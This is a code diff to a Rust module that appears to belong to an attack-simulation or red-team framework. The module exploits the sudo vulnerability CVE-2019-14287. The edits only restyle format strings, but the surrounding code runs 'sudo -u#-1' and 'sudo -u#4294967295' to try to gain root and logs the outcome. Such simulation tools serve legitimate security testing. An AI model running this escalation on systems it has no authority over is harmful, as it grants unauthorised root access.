@@ -500,9 +500,9 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
             
             if dry_run {
                 info!("[DRY RUN] Would attempt sudo unsigned integer privilege escalation");
-                info!("[DRY RUN] Command: sudo -u#-1 {}", command);
+                info!("[DRY RUN] Command: sudo -u#-1 {command}");
                 if test_both {
-                    info!("[DRY RUN] Command: sudo -u#4294967295 {}", command);
+                    info!("[DRY RUN] Command: sudo -u#4294967295 {command}");
                 }
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
@@ -521,7 +521,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
             writeln!(log_file_handle, "# CVE-2019-14287 - Sudo vulnerability").unwrap();
             writeln!(log_file_handle, "# MITRE ATT&CK: T1548.003.001").unwrap();
             writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
-            writeln!(log_file_handle, "# Target Command: {}", command).unwrap();
+            writeln!(log_file_handle, "# Target Command: {command}").unwrap();
             writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
 
             // Check if sudo is available
@@ -545,7 +545,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                     writeln!(log_file_handle, "sudo command available at: {}", String::from_utf8_lossy(&output.stdout).trim()).unwrap();
                 },
                 Err(e) => {
-                    writeln!(log_file_handle, "ERROR: Failed to check for sudo: {}", e).unwrap();
+                    writeln!(log_file_handle, "ERROR: Failed to check for sudo: {e}").unwrap();
                     return Err(format!("Failed to check for sudo: {e}"));
                 }
             }
@@ -559,7 +559,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
             match version_check {
                 Ok(output) => {
                     let version_output = String::from_utf8_lossy(&output.stdout);
-                    writeln!(log_file_handle, "Sudo version information:\n{}", version_output).unwrap();
+                    writeln!(log_file_handle, "Sudo version information:\n{version_output}").unwrap();
                     
                     // Basic version check for CVE-2019-14287 (affects versions before 1.8.28)
                     if version_output.contains("1.8.") {
@@ -567,7 +567,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                     }
                 },
                 Err(e) => {
-                    writeln!(log_file_handle, "Could not determine sudo version: {}", e).unwrap();
+                    writeln!(log_file_handle, "Could not determine sudo version: {e}").unwrap();
                 }
             }
 
@@ -575,9 +575,9 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
             
             // Test variant 1: -u#-1 (negative user ID)
             writeln!(log_file_handle, "\n## Testing sudo -u#-1 vulnerability").unwrap();
-            info!("Testing sudo -u#-1 {}", command);
+            info!("Testing sudo -u#-1 {command}");
             
-            let exploit_cmd_1 = format!("sudo -n -u#-1 {}", command);
+            let exploit_cmd_1 = format!("sudo -n -u#-1 {command}");
             let result_1 = Command::new("bash")
                 .arg("-c")
                 .arg(&exploit_cmd_1)
@@ -590,10 +590,10 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                     let stdout = String::from_utf8_lossy(&output.stdout);
                     let stderr = String::from_utf8_lossy(&output.stderr);
                     
-                    writeln!(log_file_handle, "Command: {}", exploit_cmd_1).unwrap();
-                    writeln!(log_file_handle, "Exit code: {}", exit_code).unwrap();
-                    writeln!(log_file_handle, "STDOUT: {}", stdout).unwrap();
-                    writeln!(log_file_handle, "STDERR: {}", stderr).unwrap();
+                    writeln!(log_file_handle, "Command: {exploit_cmd_1}").unwrap();
+                    writeln!(log_file_handle, "Exit code: {exit_code}").unwrap();
+                    writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
+                    writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                     
                     if exit_code == 0 && stdout.contains("uid=0") {
                         writeln!(log_file_handle, "CRITICAL: sudo -u#-1 vulnerability EXPLOITED! Gained root privileges").unwrap();
@@ -607,7 +607,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                     }
                 },
                 Err(e) => {
-                    writeln!(log_file_handle, "ERROR executing sudo -u#-1: {}", e).unwrap();
+                    writeln!(log_file_handle, "ERROR executing sudo -u#-1: {e}").unwrap();
                     test_results.push("ERROR with -u#-1".to_string());
                 }
             }
@@ -615,9 +615,9 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
             // Test variant 2: -u#4294967295 (large unsigned integer)
             if test_both {
                 writeln!(log_file_handle, "\n## Testing sudo -u#4294967295 vulnerability").unwrap();
-                info!("Testing sudo -u#4294967295 {}", command);
+                info!("Testing sudo -u#4294967295 {command}");
                 
-                let exploit_cmd_2 = format!("sudo -n -u#4294967295 {}", command);
+                let exploit_cmd_2 = format!("sudo -n -u#4294967295 {command}");
                 let result_2 = Command::new("bash")
                     .arg("-c")
                     .arg(&exploit_cmd_2)
@@ -630,10 +630,10 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                         let stdout = String::from_utf8_lossy(&output.stdout);
                         let stderr = String::from_utf8_lossy(&output.stderr);
                         
-                        writeln!(log_file_handle, "Command: {}", exploit_cmd_2).unwrap();
-                        writeln!(log_file_handle, "Exit code: {}", exit_code).unwrap();
-                        writeln!(log_file_handle, "STDOUT: {}", stdout).unwrap();
-                        writeln!(log_file_handle, "STDERR: {}", stderr).unwrap();
+                        writeln!(log_file_handle, "Command: {exploit_cmd_2}").unwrap();
+                        writeln!(log_file_handle, "Exit code: {exit_code}").unwrap();
+                        writeln!(log_file_handle, "STDOUT: {stdout}").unwrap();
+                        writeln!(log_file_handle, "STDERR: {stderr}").unwrap();
                         
                         if exit_code == 0 && stdout.contains("uid=0") {
                             writeln!(log_file_handle, "CRITICAL: sudo -u#4294967295 vulnerability EXPLOITED! Gained root privileges").unwrap();
@@ -647,7 +647,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
                         }
                     },
                     Err(e) => {
-                        writeln!(log_file_handle, "ERROR executing sudo -u#4294967295: {}", e).unwrap();
+                        writeln!(log_file_handle, "ERROR executing sudo -u#4294967295: {e}").unwrap();
                         test_results.push("ERROR with -u#4294967295".to_string());
                     }
                 }
@@ -655,7 +655,7 @@ impl AttackTechnique for SudoUnsignedIntegerEscalation {
 
             writeln!(log_file_handle, "\n## Test Summary").unwrap();
             for result in &test_results {
-                writeln!(log_file_handle, "- {}", result).unwrap();
+                writeln!(log_file_handle, "- {result}").unwrap();
             }
             
             let success = !test_results.is_empty();
